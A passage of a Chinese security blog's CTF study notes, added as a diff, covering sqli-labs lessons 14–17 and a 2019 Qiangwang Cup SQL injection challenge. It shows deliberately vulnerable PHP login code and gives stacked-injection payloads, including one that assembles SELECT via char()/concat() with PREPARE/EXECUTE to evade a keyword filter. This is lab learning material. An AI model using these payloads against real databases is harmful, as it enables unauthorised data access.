<span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">		<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2><span id="26-sqli-labs-masterless-14sqlmap-布尔没跑出来"> 26. sqli-labs-master/Less-14（sqlmap 布尔没跑出来！！！)</span></h2>
+<p>字符型报错、布尔、时间<br>
+查看源代码，发现只能报错注入，是 &quot;</p>
+<ul>
+<li>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">	<span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">	@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">  		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot; You Have successfully logged in &quot; ;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="comment">//echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span></span><br><span class="line">		<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">		<span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">		<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">		<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2><span id="27-sqli-labs-masterless-15sqlmap-布尔没跑出来"> 27. sqli-labs-master/Less-15（sqlmap 布尔没跑出来！！！)</span></h2>
+<p>字符型布尔、时间<br>
+’</p>
+<h2><span id="28-sqli-labs-masterless-16sqlmap-布尔-时间没跑出来"> 28. sqli-labs-master/Less-16（sqlmap 布尔、时间没跑出来！！！)</span></h2>
+<p>字符型布尔、时间<br>
+ &quot;)</p>
+<h2><span id="29-sqli-labs-masterless-17"> 29. sqli-labs-master/Less-17</span></h2>
+<p>字符型布尔、时间<br>
+’</p>
+<h2><span id="27-强网杯-2019-随便注"> 27. [强网杯 2019] 随便注</span></h2>
+<ol>
+<li>判断类型<br>
+ 1 or 1 = 1 #<br>
+1’ or 1 = 1 #<br>
+字符型</li>
+<li>判断字段数<br>
+ 1’ order by 2 #<br>
+1’ order by 3 #<br>
+字段数为 3</li>
+<li>联合注入？<br>
+0’ union select 1,2 #<br>
+得到：return preg_match (&quot;/select|update|delete|drop|insert|where|./i&quot;,$inject);<br>
+ 说明对这些字符进行了过滤，所以联合注入貌似不得行</li>
+<li>堆叠注入<br>
+爆库：0’;show databases;#<br>
+爆表：0’;show tables;#<br>
+爆列：0’;show columns from words;#<br>
+0’;show columns from  <code>1919810931114514</code> ;#<br>
+为什么用反引号呢？因为当数字型字符作为字段、表、库名查询时，应该用反单引号括起来输入之后得到</li>
+<li>爆值<br>
+ PREPARE sqla from ‘[my sql sequece]’;  	 预定义 SQL 语句<br>
+ EXECUTE sqla; 							 执行预定义 SQL 语句<br>
+ (DEALLOCATE || DROP) PREPARE sqla;  	 删除预定义 SQL 语句<br>
+通过变量进行传递<br>
+ SET @tn = ‘flag’;  					存储表名<br>
+ PREPARE sqla from @sql;   		预定义 SQL 语句<br>
+ EXECUTE sqla;  				执行预定义 SQL 语句<br>
+ (DEALLOCATE || DROP) PREPARE sqla;  	删除预定义 SQL 语句<br>
+ PREPARE 语句准备好一条 SQL 语句，并分配给这条 SQL 语句一个名字供之后调用。<br>
+准备好的 SQL 语句通过 EXECUTE 命令执行，通过 DEALLOCATE PREPARE 命令释放掉。</li>
+</ol>
+<p>本题即可利用 char () 方法将 ASCII 码转换为 SELECT 字符串，接着利用 concat () 方法进行拼接获得查询的 SQL 语句，最后执行即可，payload 如下：</p>
+<p>1’;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from    <code>1919810931114514</code> &quot;);PREPARE sqla from @sql;EXECUTE sqla;</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://my011215.github.io/2022/08/16/CTF/CTF%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="clbelq66s0003aotndcgvg8rz" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/09/01/cryptology/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E7%9F%AD%E5%88%86%E4%BA%AB%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/08/16/tool/BurpSuite/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">burpsuite</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/CTF/">CTF</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/%E4%B9%A6%E7%B1%8D/">书籍</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/%E5%AE%9E%E6%88%98/">实战</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/">思维导图</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/%E9%9D%A2%E8%AF%95%E9%A2%98/">面试题</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/%E9%9D%A2%E8%AF%95%E9%A2%98/XSS/">XSS</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/%E9%9D%A2%E8%AF%95%E9%A2%98/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B4%E8%B6%A3/">兴趣</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/">区块链安全</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%8D%9A%E5%BC%88%E8%AE%BA/">博弈论</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E5%88%86%E4%BA%AB/">学习分享</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/12/08/Blockchain/%E5%8D%9A%E5%BC%88%E8%AE%BA/">博弈论</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/02/vulnerability/%E4%B8%AD%E5%8D%97%E6%B0%91%E6%97%8FVPN%E7%99%BB%E5%BD%95%E6%A1%86/">中南民族VPN登录框</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/01/interview/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E9%9D%A2%E8%AF%95%E9%A2%98/">文件上传漏洞面试题</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/30/vulnerability/%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">登陆界面逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/29/CTF/%E5%88%B7%E9%A2%98/">刷题</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 草莓布丁<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/categories/%E5%AD%A6%E4%B9%A0%E5%88%86%E4%BA%AB/" class="mobile-nav-link">学习分享</a>
+  
+    <a href="/categories/web%E5%AE%89%E5%85%A8/" class="mobile-nav-link">安全</a>
+  
+    <a href="/categories/%E5%85%B4%E8%B6%A3/" class="mobile-nav-link">兴趣</a>
+  
+    <a href="/richang" class="mobile-nav-link">日常</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"left","width":200,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
+</html>
